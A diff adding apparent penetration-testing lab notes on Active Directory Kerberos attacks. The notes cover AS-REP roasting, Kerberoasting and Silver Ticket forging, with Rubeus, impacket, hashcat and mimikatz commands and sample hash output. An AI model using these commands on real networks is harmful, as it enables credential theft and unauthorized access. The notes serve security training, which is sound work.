@@ -184,3 +184,206 @@ SMB         192.168.226.75  445    CLIENT75         [+] corp.com\jeff:Secr3t! (P
 SMB         192.168.226.75  445    CLIENT75         [-] corp.com\mary:Secr3t! STATUS_LOGON_FAILURE 
 
 ```
+
+## AD Cracking Kerberos User Password with AS-REP Roasting (Crack-the-Hash for Users)
+
+Scenario
+
+* **Limitation**: AD Kerberos option Pre-Auth is DISABLED
+* **Requires**: Valid domain user credentials like passwd
+* Retrieve kerberos user password hash
+* Crask the hash with HashCat
+* From [Cracking Active Directory Passwords with AS-REP Roasting](https://blog.netwrix.com/2022/11/03/cracking_ad_password_with_as_rep_roasting/)
+
+Attack with Windows
+
+```powershell
+# No Pre-Auth users
+Import-Module powerview.ps1
+Get-DomainUser -PreauthNotRequired -Verbose
+
+cn                    : mimi
+useraccountcontrol    : NORMAL_ACCOUNT, DONT_EXPIRE_PASSWORD, DONT_REQ_PREAUTH
+
+# Disable Pre-Auth (4194304) if we have GenericAll or GenericWrite ACLs for an TargetUser
+# A SamAccountName (e.g. harmj0y), DistinguishedName (e.g. CN=harmj0y,CN=Users,DC=testlab,DC=local),
+# SID (e.g. S-1-5-21-890171859-3433809279-3366196753-1108), or GUID (e.g. 4c435dd7-dc58-4b14-9a5e-1fdb0e80d201).
+# Wildcards accepted!
+Set-DomainObject -Identity TargetUser -XOR @{useraccountcontrol=4194304} -Verbose
+
+# Verfiy the change
+Get-DomainUser -Identity TargetUser | Select-Object samaccountname, useraccountcontrol
+```
+
+```powershell
+# Get user password hash
+.\Rubeus.exe asreproast /nowrap /format:hashcat /outfile:C:\Temp\asreproast.hashes
+
+[*] AS-REP hash:
+
+      $krb5asrep$mimi@example.com:AE43CA9011CC7E7B9E7F7E7279DD7F2E$7D4C59410DE2984EDF35053B7954E6DC9A0D16CB5BE8E9DCACCA88C3C13C4031ABD71DA16F476EB972506B4989E9ABA2899C042E66792F33B119FAB1837D94EB654883C6C3F2DB6D4A8D44A8D9531C2661BDA4DD231FA985D7003E91F804ECF5FFC0743333959470341032B146AB1DC9BD6B5E3F1C41BB02436D7181727D0C6444D250E255B7261370BC8D4D418C242ABAE9A83C8908387A12D91B40B39848222F72C61DED5349D984FFC6D2A06A3A5BC19DDFF8A17EF5A22162BAADE9CA8E48DD2E87BB7A7AE0DBFE225D1E4A778408B4933A254C30460E4190C02588FBADED757AA87A
+```
+
+Attack with Kali
+
+```bash
+# No Pre-Auth users
+impacket-GetNPUsers -h
+ usage: GetNPUsers.py [-request] [-outputfile OUTPUTFILE] [-format {hashcat,john}] [-usersfile USERSFILE] [-ts] [-debug] [-hashes LMHASH:NTHASH] [-no-pass] [-k] [-aesKey hex key] [-dc-ip ip address] [-dc-host hostname] target
+
+# Get user password hash
+impacket-GetNPUsers -dc-ip 192.168.1.100  -request -outputfile asreproast.hashes example.com/user
+Password:
+
+Name  MemberOf  PasswordLastSet             LastLogon                   UAC      
+----  --------  --------------------------  --------------------------  --------
+mimi            2025-09-02 19:21:17.285464  2025-09-07 12:45:15.559299  0x410200
+
+hashcat -hh | grep -E "(Kerberos|AS-REP)"
+...
+  18200 | Kerberos 5, etype 23, AS-REP                        | Network Protocol
+
+# crack the AS-REP Hash
+sudo hashcat -m 18200 asreproast.hashes /usr/share/wordlists/rockyou.txt -r /usr/share/hashcat/rules/best64.rule --force 
+```
+
+## AD Cracking Kerberos Service Password with TGS-REP Kerberoasing (Crask-the-hash for SPNs)
+
+Scenario:
+
+* **Limitation**: If SPN run in the context of a computer account, a managed service account, or a group-managed service account, the **password will be randomly generated, complex, and 120 characters long**, making cracking infeasible. The same is true for the **krbtgt user account** which acts as service account for the KDC.
+* **Requires**: Attacker knows domain user credentials
+* **Requires**: Attacker knows service principle name (SPN) of a service to attack
+* Attacker requests a ticket granting ticket (TGT) for the domain user
+* Attacker requests a service ticket from a (TGS) for the service principal (SPNs)
+* Attacker cracks the service principal hash using **RC4 algorithm** using hashcat
+* From: [Kerberoasting](https://blog.harmj0y.net/redteaming/kerberoasting-revisited/)
+* Tool: [Rubeus.exe](https://github.com/GhostPack/Rubeus/releases)
+
+Attack with Windows
+
+* option /tgtdeleg lowers hash encryption security to weak RC4
+* this is way faster than AES crack
+
+```powershell
+# Get service password hash
+.\Rubeus.exe kerberoast /tgtdeleg /nowrap /format:hashcat /outfile:kerberoast.hashes
+
+ [*] Action: Kerberoasting
+ 
+ [*] Using 'tgtdeleg' to request a TGT for the current user
+ [*] RC4_HMAC will be the requested for AES-enabled accounts
+
+ $krb5tgs$23$*iis_service$CORP.COM$HTTP/web04.corp.com:80*$7c10fd1e3bdf0ff41f001 ...
+
+ # List service principle for user
+ setspn.exe -L iis_services
+```
+
+Attack with Kali
+
+```bash
+# Get service password hash
+sudo impacket-GetUserSPNs -request -dc-ip 192.168.1.100 example.com/mimi
+
+# crack the TGS-REP hash
+hashcat -hh | grep -E "(Kerberos|TGS-REP)"
+...
+ 13100 | Kerberos 5, etype 23, TGS-REP                       | Network Protocol
+
+sudo hashcat -m 13100 kerberoast.hashes /usr/share/wordlists/rockyou.txt -r /usr/share/hashcat/rules/best64.rule --force
+```
+
+## AD Keberos Silver Ticket (Make your own service ticket)
+
+The Kerberos Silver Ticket is a valid Ticket Granting Service (TGS) Kerberos ticket since it is encrypted/signed by the service account configured with a Service Principal Name for each server the Kerberos-authenticating service runs on. This means the Silver Ticket scope is limited to whatever **service is targeted on a specific server**. Good news since a **Silver Ticket is a forged TGS**, there is **no communication with a Domain Controller**. Most services don’t validate the PAC (by sending the PAC checksum to the Domain Controller for PAC validation), so a valid TGS generated with the service account password hash can include a PAC that is entirely fictitious – even **claiming the user is a Domain Admin** without challenge or correction.
+
+Sitation:
+
+* **Limitation**: Service applications MUST NOT be configured perform pirvileged authencation certificate PAC validation (default)
+* **Requires**: Attacker has local Admin to use mimikatz
+* **Requires**: Attacker knows service account SPNs password or its associated NTLM hash
+* Use mimikatz to create silver ticket: a **custom service ticket to access the target resource** with any permission want
+  * Service Target SPN password hash
+  * Domain SID
+  * Target SPN
+* From: [How Attackers Use Kerberos Silver Tickets to Exploit Systems](https://adsecurity.org/?p=2011)
+
+We need to provide the **domain SID** (/sid:), domain name (/domain:), and the **target where the SPN** runs (/target:). We also need to include the **SPN protocol** (/service:), **NTLM hash of the Tartget service SPN** (/rc4:), and the /ptt option, which allows us to **inject the forged ticket into the memory** of the machine we execute the command on. Finally, we must enter **any existing domain user** for /user:. This user will be set in the forged ticket. 
+
+```powershell
+# Get SPN password hash
+privilege::debug
+sekurlsa::logonpasswords
+
+Session           : Service from 0
+User Name         : iis_service
+Domain            : CORP
+Logon Server      : DC1
+Logon Time        : 10/3/2025 5:36:24 AM
+SID               : S-1-5-21-1987370270-658905905-1781884369-1109
+        msv :
+         [00000003] Primary
+         * Username : iis_service
+         * Domain   : CORP
+         * NTLM     : 4d28cf5252d39971419580a51484ca09
+
+# Get Domain SID
+whoami /user
+
+User Name SID
+========= =============================================
+corp\jeff S-1-5-21-1987370270-658905905-1781884369-xxxx
+
+# Get Target SPN
+setspn -L iis_service
+Registered ServicePrincipalNames for CN=iis_service,CN=Users,DC=corp,DC=com:
+        HTTP/web01.corp.com
+        HTTP/web01
+        HTTP/web01.corp.com:80
+```
+
+```powershell
+# Use mimikatz to create SILVER ticket for a Target SPN
+# CIFS/share.corp.com
+# HTTP/web01.corp.com
+kerberos::golden /sid:S-1-5-21-1987370270-658905905-1781884369 /domain:corp.com /ptt /target:share.corp.com /service:cifs /rc4:4d28cf5252d39971419580a51484ca09 /admin:jeff /id:1106 
+kerberos::golden /sid:S-1-5-21-1987370270-658905905-1781884369 /domain:corp.com /ptt /target:web01.corp.com /service:http /rc4:4d28cf5252d39971419580a51484ca09 /user:jeffadmin
+
+User      : jeff
+Domain    : corp.com (CORP)
+SID       : S-1-5-21-1987370270-658905905-1781884369
+User Id   : 500
+Groups Id : *513 512 520 518 519
+ServiceKey: 4d28cf5252d39971419580a51484ca09 - rc4_hmac_nt
+Service   : http
+Target    : web01.corp.com
+Lifetime  : 9/14/2025 4:37:32 AM ; 9/11/2035 4:37:32 AM ; 9/11/2032 4:37:32 AM
+-> Ticket : ** Pass The Ticket **
+
+...
+Golden ticket for 'jeffadmin @ corp.com' successfully submitted for current session
+```
+
+```powershell
+# List the silver ticket
+klist
+
+Current LogonId is 0:0xa04cc
+
+Cached Tickets: (1)
+
+#0>     Client: jeffadmin @ corp.com
+        Server: http/web01.corp.com @ corp.com
+        KerbTicket Encryption Type: RSADSI RC4-HMAC(NT)
+        Ticket Flags 0x40a00000 -> forwardable renewable pre_authent
+        Start Time: 9/14/2025 4:37:32 (local)
+        End Time:   9/11/2035 4:37:32 (local)
+        Renew Time: 9/11/2035 4:37:32 (local)
+        Session Key Type: RSADSI RC4-HMAC(NT)
+        Cache Flags: 0
+        Kdc Called:
+
+# User the silver ticket to access the service
+Invoke-WebRequest -UseDefaultCredentials http://web01
+```
